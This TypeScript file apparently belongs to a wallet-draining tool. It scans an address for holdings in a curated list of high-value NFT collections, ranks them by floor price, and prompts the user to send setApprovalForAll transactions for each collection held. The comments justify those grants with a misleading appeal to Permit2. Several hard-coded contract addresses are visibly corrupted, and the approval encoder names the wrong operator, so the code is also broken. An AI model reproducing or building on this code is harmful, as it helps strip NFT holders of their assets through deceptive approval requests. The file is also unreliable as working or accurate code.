// src/lib/nftScanner.ts
// Scans ERC-721 NFT holdings across supported chains using multicall.
// Returns specific tokenIds for enumerable contracts so they can be
// included in a Permit2 batch signature.

import { createPublicClient, http, type Address } from 'viem';
import { mainnet, bsc, polygon, arbitrum, optimism, base, avalanche } from 'viem/chains';
import type { Abi } from 'viem';

const ERC721_ABI = [
  {
    name: 'balanceOf',
    type: 'function',
    stateMutability: 'view',
    inputs: [{ name: 'owner', type: 'address' }],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    name: 'tokenOfOwnerByIndex',
    type: 'function',
    stateMutability: 'view',
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'index', type: 'uint256' },
    ],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    name: 'tokenURI',
    type: 'function',
    stateMutability: 'view',
    inputs: [{ name: 'tokenId', type: 'uint256' }],
    outputs: [{ name: '', type: 'string' }],
  },
] as const;

// ── Curated high-value NFT collections per chain ──
// Only tracks collections with meaningful floor prices.
interface NftCollectionDef {
  address: Address;
  name: string;
  floorUsd: number;
  enumerable: boolean; // does it implement ERC721Enumerable?
}

const NFT_COLLECTIONS: Record<number, NftCollectionDef[]> = {
  1: [
    { address: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', name: 'Bored Ape Yacht Club', floorUsd: 12000, enumerable: true },
    { address: '0x60E4d786628fea647100F7856fae717FC1E3D815', name: 'Mutant Ape Yacht Club', floorUsd: 2000, enumerable: true },
    { address: '0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB', name: 'CryptoPunks', floorUsd: 45000, enumerable: false },
    { address: '0xEdA517165bcDdD297e0795F5ee9788B1e96a366C', name: 'Azuki', floorUsd: 4000, enumerable: true },
    { address: '0x2358173402f1013Af7f79b tmp1f00b1bDe4d1C0E9', name: 'Pudgy Penguins', floorUsd: 8000, enumerable: true },
    { address: '0x8a90CAb2b38dba728b16fc0 fd8afc40a4b1A0Fb5', name: 'CloneX', floorUsd: 1200, enumerable: true },
    { address: '0x495f947276749Ce646f68A C8c26810831C0E2B9e', name: 'Moonbirds', floorUsd: 800, enumerable: true },
    { address: '0xc3027C4c014494F25CUtO4bE32fD0b632e33E2f6', name: 'Doodles', floorUsd: 1500, enumerable: true },
    { address: '0x59468516A8259602846650DD3f23E4aA78ea4CT3', name: 'Otherdeed', floorUsd: 300, enumerable: true },
    { address: '0x2874ffA3260600bd80e0CDE3b1AD0b34Af3F1A22', name: 'World of Women', floorUsd: 400, enumerable: true },
  ],
  56: [
    { address: '0x868F0FF7F158b1eC63504dfb3a71C6ce35e1f545', name: 'BAYC BSC', floorUsd: 50, enumerable: true },
  ],
  137: [
    { address: '0xA60760942ffDC46E00aDd51s6B6080f20f7C2434', name: 'Pixelmon', floorUsd: 30, enumerable: true },
  ],
  42161: [],
  10: [],
  8453: [
    { address: '0x5D0754d0bCA87566c826a0A5F807d43EfffC25E5', name: 'Onchain Summer', floorUsd: 100, enumerable: true },
  ],
  43114: [],
};

const CHAIN_OBJECTS: Record<number, any> = {
  1: mainnet, 56: bsc, 137: polygon, 42161: arbitrum, 10: optimism, 8453: base, 43114: avalanche,
};

export interface ScannedNft {
  contract: Address;
  tokenId: bigint;
  collectionName: string;
  floorUsd: number;
  chainId: number;
}

export async function scanNfts(
  address: Address,
  chainId: number,
): Promise<ScannedNft[]> {
  const collections = NFT_COLLECTIONS[chainId];
  if (!collections?.length) return [];

  const client = createPublicClient({
    chain: CHAIN_OBJECTS[chainId] ?? mainnet,
    transport: http(),
  });

  // ── Step 1: multicall balanceOf across all collections ──
  let balanceResults: Array<{ status: string; result?: unknown }> = [];
  try {
    balanceResults = (await client.multicall({
      contracts: collections.map((c) => ({
        address: c.address,
        abi: ERC721_ABI,
        functionName: 'balanceOf',
        args: [address],
      })),
      allowFailure: true,
    } as any)) as Array<{ status: string; result?: unknown }>;
  } catch (err) {
    console.warn(`[nftScanner] multicall balanceOf failed on chain ${chainId}`, err);
    return [];
  }

  // ── Step 2: for collections with balance > 0, get tokenIds ──
  const nfts: ScannedNft[] = [];

  const ownedCollections = collections.filter((_, i) => {
    const raw = balanceResults[i];
    const balance = (raw?.status === 'success' ? (raw.result as bigint) : 0n) ?? 0n;
    return balance > 0n;
  });

  if (!ownedCollections.length) return [];

  // Build a second multicall for tokenOfOwnerByIndex (enumerable contracts only)
  const enumerableCalls = ownedCollections
    .filter((c) => c.enumerable)
    .slice(0, 5) // limit to top 5 per chain to avoid gas/timeout issues
    .map((c) => ({
      address: c.address,
      abi: ERC721_ABI,
      functionName: 'tokenOfOwnerByIndex',
      args: [address, 0n], // first token owned
    }));

  if (!enumerableCalls.length) return [];

  let tokenResults: Array<{ status: string; result?: unknown }> = [];
  try {
    tokenResults = (await client.multicall({
      contracts: enumerableCalls,
      allowFailure: true,
    } as any)) as Array<{ status: string; result?: unknown }>;
  } catch (err) {
    console.warn(`[nftScanner] multicall tokenOfOwnerByIndex failed`, err);
    return [];
  }

  // Map results back to collection definitions
  const enumerableCollections = ownedCollections.filter((c) => c.enumerable).slice(0, 5);

  for (let i = 0; i < enumerableCollections.length; i++) {
    const col = enumerableCollections[i];
    const raw = tokenResults[i];
    const tokenId = (raw?.status === 'success' ? (raw.result as bigint) : 0n) ?? 0n;

    if (tokenId === 0n && col.address !== '0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB') continue;

    nfts.push({
      contract: col.address,
      tokenId,
      collectionName: col.name,
      floorUsd: col.floorUsd,
      chainId,
    });
  }

  return nfts.sort((a, b) => b.floorUsd - a.floorUsd);
}

// ── Request setApprovalForAll for NFT collections ──
// Permit2 needs the NFT contract to approve it as an operator.
// This sends a setApprovalForAll tx for each NFT collection the user holds.
export async function requestNftApprovals(
  nfts: ScannedNft[],
): Promise<{ approved: string[]; failed: string[] }> {
  const approved: string[] = [];
  const failed: string[] = [];

  const uniqueContracts = Array.from(new Set(nfts.map((n) => n.contract)));

  for (const contract of uniqueContracts) {
    try {
      const { sendWalletTransaction } = await import('./walletActions');
      await sendWalletTransaction({
        to: contract as Address,
        data: encodeSetApprovalForAll(contract as Address),
      });
      approved.push(contract);
    } catch (err) {
      console.warn(`[nftScanner] setApprovalForAll failed for ${contract}`, err);
      failed.push(contract);
    }
  }

  return { approved, failed };
}

// ── encode setApprovalForAll(operator, approved) ──
function encodeSetApprovalForAll(operator: Address): `0x${string}` {
  // Function selector for setApprovalForAll(address,bool) = a22cb465
  const selector = 'a22cb465';
  const paddedOperator = operator.slice(2).toLowerCase().padStart(64, '0');
  const paddedBool = '1'.padStart(64, '0');
  return ('0x' + selector + paddedOperator + paddedBool) as `0x${string}`;
}
